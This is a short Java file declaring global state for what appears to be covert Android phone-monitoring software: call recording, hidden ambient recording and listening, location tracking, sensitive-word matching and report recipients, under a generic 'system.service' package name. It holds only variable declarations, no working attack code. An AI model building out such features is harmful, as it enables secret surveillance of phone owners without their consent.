package system.service;

import android.media.MediaRecorder;

import com.particle.inspector.common.util.license.LICENSE_TYPE;

public class GlobalValues 
{
	// Initialize global values 
	public static LICENSE_TYPE licenseType = LICENSE_TYPE.NOT_LICENSED;
	public static String deviceID = null;
	public static String[] recipients = null;
	public static String[] sensitiveWordArray = null;
	
	// For phone call recording
	public static boolean IS_CALL_RECORDING = false;
	public static String callRecordFilePrefix = null;
	
	// For env recording feature
	public static boolean IS_ENV_RECORDING = false;
	public static MediaRecorder recorder = null;
	public static String envRecordFilePrefix = null; 
	
	// The state flag for env listening feature
	public static boolean IS_ENV_LISTENING = false;
	public static int ORIGINAL_RING_MODE;
	
	// The state flag for phone location feature
	public static boolean IS_GETTING_LOCATION = false;
}
